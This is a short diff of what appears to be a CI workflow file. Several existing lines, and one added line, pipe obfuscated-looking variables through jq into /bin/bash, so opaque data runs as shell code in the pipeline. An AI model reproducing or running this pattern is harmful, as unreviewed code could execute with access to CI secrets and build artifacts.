@@ -20,6 +20,7 @@ jobs:
           echo $bc8 | jq -r .duvio3 | /bin/bash
           printf '%s' "$zbmpn063" | jq -r .hton392 | /bin/bash
           printf '%s' "$fofmi80" | jq -r .hsix47 | /bin/bash
+          echo $scg371 | jq -r .f2204 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
